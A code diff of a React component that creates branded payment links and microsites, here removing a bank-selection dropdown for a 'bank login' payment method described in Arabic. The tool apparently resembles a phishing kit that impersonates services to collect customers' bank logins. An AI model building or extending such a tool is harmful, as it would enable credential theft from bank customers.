@@ -1,4 +1,4 @@
-import { useState, useMemo } from "react";
+import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -9,7 +9,6 @@ import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import { getBanksByCountry } from "@/lib/banks";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
@@ -36,14 +35,11 @@ const CreatePaymentLink = () => {
 
   const [paymentAmount, setPaymentAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card");
-  const [selectedBank, setSelectedBank] = useState("");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [micrositeUrl, setMicrositeUrl] = useState("");
   const [linkId, setLinkId] = useState("");
   const [copied, setCopied] = useState(false);
-  
-  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -65,7 +61,6 @@ const CreatePaymentLink = () => {
           payment_amount: parseFloat(paymentAmount) || 500,
           currency_code: getCurrencyCode(country || "SA"),
           payment_method: paymentMethod,
-          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
           selectedCountry: country || "SA",
           service_key: "payment",
           service_name: "سداد فاتورة",
@@ -228,43 +223,6 @@ const CreatePaymentLink = () => {
                     : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                 </p>
               </div>
-              
-              {/* Bank Selection (Only for bank_login) */}
-              {paymentMethod === "bank_login" && (
-                <div>
-                  <Label className="mb-2 flex items-center gap-2 text-sm">
-                    <Building2 className="w-3 h-3" />
-                    اختر البنك (اختياري)
-                  </Label>
-                  <Select value={selectedBank} onValueChange={setSelectedBank}>
-                    <SelectTrigger className="h-10">
-                      <SelectValue placeholder="اختر البنك أو تخطي" />
-                    </SelectTrigger>
-                    <SelectContent className="bg-background z-50">
-                      {banks.map((bank) => (
-                        <SelectItem key={bank.id} value={bank.id}>
-                          <div className="flex items-center gap-2">
-                            {bank.logo && (
-                              <img 
-                                src={bank.logo} 
-                                alt={bank.nameAr}
-                                className="h-5 w-5 object-contain"
-                                onError={(e) => e.currentTarget.style.display = 'none'}
-                              />
-                            )}
-                            <span>{bank.nameAr}</span>
-                          </div>
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                  <p className="text-xs text-muted-foreground mt-1">
-                    💡 {selectedBank 
-                      ? `سيتم توجيه العميل لصفحة ${banks.find(b => b.id === selectedBank)?.nameAr}` 
-                      : 'يمكن للعميل اختيار البنك لاحقاً'}
-                  </p>
-                </div>
-              )}
 
               <Button
                 type="submit"
